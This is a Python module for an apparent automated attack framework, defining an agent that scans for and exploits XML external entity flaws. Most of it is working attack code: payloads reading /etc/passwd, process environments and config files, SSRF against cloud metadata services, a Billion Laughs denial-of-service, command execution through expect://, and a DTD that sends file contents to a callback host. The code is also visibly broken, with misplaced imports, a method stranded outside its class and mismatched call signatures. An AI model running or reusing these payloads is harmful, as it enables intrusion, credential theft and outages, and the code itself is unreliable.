"""
import os
XXE (XML External Entity) Exploitation Agent
ค้นหาและ exploit XXE vulnerabilities
"""

import asyncio
import httpx
import base64
from typing import Dict, List, Optional, Any
from core.base_agent import BaseAgent
from core.data_models import AgentData, AttackPhase
from core.logger import log


class XXEAgent(BaseAgent):
    """XXE exploitation agent"""
    
    supported_phases = [AttackPhase.INITIAL_FOOTHOLD, AttackPhase.EXPLOITATION]
    required_tools = []
    
    def __init__(self, context_manager=None, orchestrator=None, data_exfiltrator=None, **kwargs):
        super().__init__(context_manager, orchestrator, **kwargs)
        self.exfiltrator = data_exfiltrator
        self.timeout = 30.0
    
    async def scan(self, url: str) -> Dict:
        """
        Scan for XXE vulnerabilities
        
        Args:
            url: Target URL
        
        Returns:
            Dict with scan results
        """
        
        log.info(f"[XXE] Scanning {url}")
        
        vulnerabilities = []
        
        # Test basic XXE
        basic_xxe = await self._test_basic_xxe(url)
        if basic_xxe:
            vulnerabilities.append(basic_xxe)
        
        # Test blind XXE
        blind_xxe = await self._test_blind_xxe(url)
        if blind_xxe:
            vulnerabilities.append(blind_xxe)
        
        # Test XXE via file upload
        upload_xxe = await self._test_xxe_file_upload(url)
        if upload_xxe:
            vulnerabilities.append(upload_xxe)
        
        return {
            'url': url,
            'vulnerabilities': vulnerabilities,
            'count': len(vulnerabilities)
        }
    
    async def exploit(self, url: str, attack_type: str = 'file_read') -> Dict:
        """
        Exploit XXE vulnerability
        
        Args:
            url: Target URL
            attack_type: 'file_read', 'ssrf', 'dos', 'rce'
        
        Returns:
            Dict with exploitation results
        """
        
        log.info(f"[XXE] Exploiting {url} with {attack_type}")
        
        if attack_type == 'file_read':
            return await self._exploit_file_read(url)
        elif attack_type == 'ssrf':
            return await self._exploit_ssrf(url)
        elif attack_type == 'dos':
            return await self._exploit_dos(url)
        elif attack_type == 'rce':
            return await self._exploit_rce(url)
        else:
            return {
                'success': False,
                'error': f'Unknown attack type: {attack_type}'
            }
    
    async def _test_basic_xxe(self, url: str) -> Optional[Dict]:
        """Test for basic XXE vulnerability"""
        
        # Test payload - read /etc/hostname
        test_payload = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY>
<!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<foo>&xxe;</foo>'''
        
        async with httpx.AsyncClient(timeout=self.timeout, verify=False) as client:
            try:
                # Test with XML content type
                response = await client.post(
                    url,
                    content=test_payload,
                    headers={'Content-Type': 'application/xml'}
                )
                
                # Check if file content is reflected
                if response.status_code == 200 and len(response.text) > 0:
                    # Look for typical hostname patterns
                    if any(c.isalnum() for c in response.text):
                        return {
                            'type': 'basic_xxe',
                            'confidence': 'high',
                            'payload': test_payload[:100] + '...'
                        }
            
            except Exception as e:
                log.debug(f"[XXE] Basic test error: {e}")
        
        return None
    
    async def _test_blind_xxe(self, url: str) -> Optional[Dict]:
        """Test for blind XXE vulnerability"""
        
        # Blind XXE payload (requires external server)
        # For testing, we use a simple payload
        test_payload = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY>
<!ENTITY % xxe SYSTEM "http://' + os.getenv('C2_DOMAIN', 'localhost:8000') + '/xxe.dtd">
%xxe;
]>
<foo>test</foo>'''
        
        async with httpx.AsyncClient(timeout=self.timeout, verify=False) as client:
            try:
                response = await client.post(
                    url,
                    content=test_payload,
                    headers={'Content-Type': 'application/xml'}
                )
                
                # Blind XXE - check for different behavior
                if response.status_code != 404:
                    return {
                        'type': 'blind_xxe',
                        'confidence': 'medium',
                        'note': 'Requires external DTD server for confirmation'
                    }
            
            except Exception as e:
                log.debug(f"[XXE] Blind test error: {e}")
        
        return None
    
    async def _test_xxe_file_upload(self, url: str) -> Optional[Dict]:
        """Test for XXE via file upload"""
        
        # XXE payload in SVG file
        svg_xxe = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
<!ELEMENT svg ANY>
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg">
<text>&xxe;</text>
</svg>'''
        
        async with httpx.AsyncClient(timeout=self.timeout, verify=False) as client:
            try:
                # Upload SVG file
                files = {'file': ('test.svg', svg_xxe, 'image/svg+xml')}
                response = await client.post(url, files=files)
                
                if response.status_code == 200:
                    # Check if file content is reflected
                    if 'root:' in response.text or '/bin/' in response.text:
                        return {
                            'type': 'xxe_file_upload',
                            'confidence': 'high',
                            'file_type': 'svg'
                        }
            
            except Exception as e:
                log.debug(f"[XXE] File upload test error: {e}")
        
        return None
    
    async def _exploit_file_read(self, url: str) -> Dict:
        """Exploit XXE to read files"""
        
        # Files to read
        target_files = [
            '/etc/passwd',
            '/etc/hosts',
            '/etc/hostname',
            '/proc/self/environ',
            '/var/www/html/config.php',
            'C:\\Windows\\System32\\drivers\\etc\\hosts',
            'C:\\inetpub\\wwwroot\\web.config',
        ]
        
        results = []
        
        async with httpx.AsyncClient(timeout=self.timeout, verify=False) as client:
            for file_path in target_files:
                try:
                    # Create XXE payload
                    payload = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY>
<!ENTITY xxe SYSTEM "file://{file_path}">
]>
<foo>&xxe;</foo>'''
                    
                    # Send request
                    response = await client.post(
                        url,
                        content=payload,
                        headers={'Content-Type': 'application/xml'}
                    )
                    
                    if response.status_code == 200 and len(response.text) > 0:
                        # Extract file content
                        content = response.text
                        
                        results.append({
                            'file': file_path,
                            'content': content[:1000],
                            'size': len(content)
                        })
                        
                        # Store in loot
                        if self.exfiltrator:
                            self.exfiltrator.store_file(
                                filename=file_path.replace('/', '_').replace('\\', '_'),
                                content=content.encode(),
                                source=url
                            )
                        
                        log.info(f"[XXE] Successfully read {file_path}")
                
                except Exception as e:
                    log.debug(f"[XXE] File read error for {file_path}: {e}")
        
        return {
            'success': len(results) > 0,
            'attack_type': 'file_read',
            'files_read': len(results),
            'results': results
        }
    
    async def _exploit_ssrf(self, url: str) -> Dict:
        """Exploit XXE for SSRF"""
        
        # SSRF targets
        ssrf_targets = [
            'http://localhost:80',
            'http://localhost:8080',
            'http://localhost:3306',
            'http://169.254.169.254/latest/meta-data/',  # AWS metadata
            'http://metadata.google.internal/computeMetadata/v1/',  # GCP metadata
        ]
        
        results = []
        
        async with httpx.AsyncClient(timeout=self.timeout, verify=False) as client:
            for target in ssrf_targets:
                try:
                    # Create XXE SSRF payload
                    payload = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY>
<!ENTITY xxe SYSTEM "{target}">
]>
<foo>&xxe;</foo>'''
                    
                    # Send request
                    response = await client.post(
                        url,
                        content=payload,
                        headers={'Content-Type': 'application/xml'}
                    )
                    
                    if response.status_code == 200 and len(response.text) > 0:
                        results.append({
                            'target': target,
                            'response': response.text[:500],
                            'status': 'accessible'
                        })
                        
                        log.info(f"[XXE] SSRF successful to {target}")
                
                except Exception as e:
                    log.debug(f"[XXE] SSRF error for {target}: {e}")
        
        return {
            'success': len(results) > 0,
            'attack_type': 'ssrf',
            'targets_reached': len(results),
            'results': results
        }
    
    async def _exploit_dos(self, url: str) -> Dict:
        """Exploit XXE for DoS (Billion Laughs Attack)"""
        
        # Billion Laughs payload
        dos_payload = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE lolz [
<!ENTITY lol "lol">
<!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
<!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
<!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
<!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
<!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
<!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
<!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>'''
        
        async with httpx.AsyncClient(timeout=self.timeout, verify=False) as client:
            try:
                # Send DoS payload
                response = await client.post(
                    url,
                    content=dos_payload,
                    headers={'Content-Type': 'application/xml'}
                )
                
                return {
                    'success': True,
                    'attack_type': 'dos',
                    'note': 'Billion Laughs attack sent',
                    'warning': 'May cause server DoS'
                }
            
            except Exception as e:
                return {
                    'success': False,
                    'attack_type': 'dos',
                    'error': str(e)
                }
    
    async def _exploit_rce(self, url: str) -> Dict:
        """Exploit XXE for RCE (via expect:// wrapper in PHP)"""
        
        # XXE RCE payload (PHP expect wrapper)
        rce_commands = [
            'whoami',
            'id',
            'uname -a',
        ]
        
        results = []
        
        async with httpx.AsyncClient(timeout=self.timeout, verify=False) as client:
            for cmd in rce_commands:
                try:
                    # Create XXE RCE payload
                    payload = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY>
<!ENTITY xxe SYSTEM "expect://{cmd}">
]>
<foo>&xxe;</foo>'''
                    
                    # Send request
                    response = await client.post(
                        url,
                        content=payload,
                        headers={'Content-Type': 'application/xml'}
                    )
                    
                    if response.status_code == 200 and len(response.text) > 0:
                        results.append({
                            'command': cmd,
                            'output': response.text[:500]
                        })
                        
                        log.info(f"[XXE] RCE successful: {cmd}")
                
                except Exception as e:
                    log.debug(f"[XXE] RCE error for {cmd}: {e}")
        
        return {
            'success': len(results) > 0,
            'attack_type': 'rce',
            'commands_executed': len(results),
            'results': results,
            'note': 'Requires PHP expect extension'
        }
    
    def generate_dtd_file(self, callback_url: str) -> str:
        """
        Generate external DTD file for blind XXE
        
        Args:
            callback_url: Attacker's server URL
        
        Returns:
            DTD file content
        """
        
        dtd_content = f'''<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM '{callback_url}?data=%file;'>">
%eval;
%exfiltrate;'''
        
        return dtd_content
    
    def generate_svg_xxe(self, file_path: str = '/etc/passwd') -> str:
        """
        Generate SVG file with XXE payload
        
        Args:
            file_path: File to read
        
        Returns:
            SVG content
        """
        
        svg_content = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
<!ELEMENT svg ANY>
<!ENTITY xxe SYSTEM "file://{file_path}">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
<text x="10" y="20">&xxe;</text>
</svg>'''
        
        return svg_content
    
    def generate_docx_xxe(self, file_path: str = '/etc/passwd') -> bytes:
        """
        Generate DOCX file with XXE payload
        
        Args:
            file_path: File to read
        
        Returns:
            DOCX file bytes
        """
        
        # XXE in document.xml
        document_xml = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file://{file_path}">
]>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
<w:body>
<w:p><w:r><w:t>&xxe;</w:t></w:r></w:p>
</w:body>
</w:document>'''
        
        # Note: This is simplified. Real DOCX requires proper ZIP structure
        return document_xml.encode()


# Example usage
if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    
    async def test():
        from core.data_exfiltration import DataExfiltrator
        
        exfiltrator = DataExfiltrator()
        agent = XXEAgent(exfiltrator)
        
        # Scan for XXE
        result = await agent.scan("http://target.com/xml_endpoint")
        
        print(f"Vulnerabilities found: {result['count']}")
        
        # Exploit - read files
        if result['count'] > 0:
            exploit_result = await agent.exploit(
                "http://target.com/xml_endpoint",
                attack_type='file_read'
            )
            print(f"Files read: {exploit_result['files_read']}")
    
    asyncio.run(test())



    async def run(self, directive: str, context: Dict[str, Any]) -> AgentData:
        """
        Main execution method for XXE Agent
        
        Args:
            directive: "scan", "exploit", or "auto"
            context: {
                "url": target URL,
                "attack_type": "file_read", "ssrf", "dos", or "rce" (optional),
                "file_path": file to read (optional),
                "callback_url": URL for out-of-band XXE (optional)
            }
        
        Returns:
            Dict with results
        """
        log.info(f"[XXEAgent] Starting with directive: {directive}")
        
        url = context.get("url")
        if not url:
            return {
                "success": False,
                "error": "No URL provided in context"
            }
        
        try:
            if directive == "scan":
                # Scan for XXE vulnerabilities
                result = await self.scan(url)
                return AgentData(
                    agent_name="XXEAgent",
                    success=result["count"] > 0,
                    data=result
                )
            
            elif directive == "exploit":
                # Exploit XXE vulnerability
                attack_type = context.get("attack_type", "file_read")
                file_path = context.get("file_path", "/etc/passwd")
                callback_url = context.get("callback_url")
                
                result = await self.exploit(
                    url,
                    attack_type=attack_type,
                    file_path=file_path,
                    callback_url=callback_url
                )
                
                return AgentData(
                    agent_name="XXEAgent",
                    success=result.get("success", False),
                    data=result
                )
            
            elif directive == "auto":
                # Auto: scan then exploit
                scan_result = await self.scan(url)
                
                if scan_result["count"] > 0:
                    log.info(f"[XXEAgent] Found {scan_result['count']} vulnerabilities, attempting exploitation...")
                    
                    attack_type = context.get("attack_type", "file_read")
                    file_path = context.get("file_path", "/etc/passwd")
                    callback_url = context.get("callback_url")
                    
                    exploit_result = await self.exploit(
                        url,
                        attack_type=attack_type,
                        file_path=file_path,
                        callback_url=callback_url
                    )
                    
                    return AgentData(
                        agent_name="XXEAgent",
                        success=exploit_result.get("success", False),
                        data={
                            "scan": scan_result,
                            "exploit": exploit_result
                        }
                    )
                else:
                    return AgentData(
                        agent_name="XXEAgent",
                        success=False,
                        data={
                            "message": "No XXE vulnerabilities found",
                            "scan": scan_result
                        }
                    )
            
            else:
                return AgentData(
                    agent_name="XXEAgent",
                    success=False,
                    data={"error": f"Unknown directive: {directive}"}
                )
        
        except Exception as e:
            log.error(f"[XXEAgent] Error: {e}")
            return AgentData(
                agent_name="XXEAgent",
                success=False,
                data={"error": str(e)}
            )


